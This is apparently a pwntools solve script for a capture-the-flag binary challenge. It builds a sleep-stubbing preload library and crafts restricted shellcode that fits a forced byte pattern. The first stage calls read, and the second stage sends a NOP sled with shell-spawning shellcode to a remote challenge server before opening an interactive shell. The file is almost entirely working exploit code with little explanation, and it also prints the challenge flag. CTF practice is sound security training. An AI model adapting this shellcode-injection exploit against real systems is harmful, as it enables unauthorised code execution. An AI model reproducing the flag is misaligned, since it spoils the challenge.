#!/usr/bin/env python3

from pwn import *
import sys
from typing import Union
from tempfile import NamedTemporaryFile

binary = ELF("./modomodohayaku_patched")

context.binary = binary
context.terminal = ["tmux", "splitw", "-h", "-e", "GDB=pwndbg"]


if not os.path.exists("./libnosleep.so"):
    with NamedTemporaryFile() as f:
        f.write('''
#define _GNU_SOURCE
// hook sleep to do nothing
unsigned int sleep(unsigned int seconds) {
    return 0;
}
'''.strip().encode())
        f.flush()
        os.system(f"gcc -x c -shared -fPIC -o libnosleep.so {f.name} -ldl")



def one_gadget(filename: str) -> list:
    return [int(i) for i in
            __import__('subprocess').check_output(['one_gadget', '--raw', filename]).decode().split(' ')]


GDB_SCRIPT = '''
# b *0x4015BB
patch sleep ret
b *0x4015D1
'''.strip()


def conn() -> Union[process, remote]:
    io = None
    for arg in sys.argv[1:]:
        # ./solve <any option> d
        if arg == 'd':
            context.log_level = 'debug'
        # ./solve l
        if arg == 'l':
            io = process([binary.path], env={"LD_PRELOAD": "./libnosleep.so"})
        # ./solve g
        elif arg == 'g':
            io = gdb.debug([binary.path], gdbscript=GDB_SCRIPT)
    # $ ./solve
    if io is None:
        io = remote("ctf.adl.tw", 10006)
    return io

def fix(payload):
    print(payload)
    payload = list(payload)
    edx = 0
    for edx in range(0x10):
        # mov     eax, edx
        # add     eax, eax
        # add     eax, edx
        # add     eax, eax
        eax = edx
        eax += eax 
        eax = eax + edx
        eax += eax
        print(eax)
        payload[eax] = 0xc
        payload[eax + 1] = 0x87
        payload[eax + 2] = 0x63

    return bytes(payload)


def main():
    io = conn()

    # every 6 bytes starts with `\x0c\x87\x63`
    payload = b"\x0c\x87\x63\xd1" # mov al, 0x87; movsxd edx, ecx
    payload += asm(
        '''
        mov eax, eax
        '''
    )
    payload = payload.ljust(9, b"\x00")
    payload += b"\xc7" # mov al, 0x87; movsxd eax, edi
    payload += asm(
        '''
        syscall
        '''
    )
    nop_sled_len = len(payload)
    info(f"payload len: {nop_sled_len}")
    payload = payload.ljust(0x60, b'\x00')
    payload = fix(payload)
    io.sendafter(b"!!!\n", payload)
    payload = b"\x90" * nop_sled_len
    payload += asm(shellcraft.sh())
    io.sendline(payload)
    io.interactive() # ADL{G1v3_m3_73n_53c0nd5!!!https://youtu.be/UljR2IQAVfw}


if __name__ == "__main__":
    main()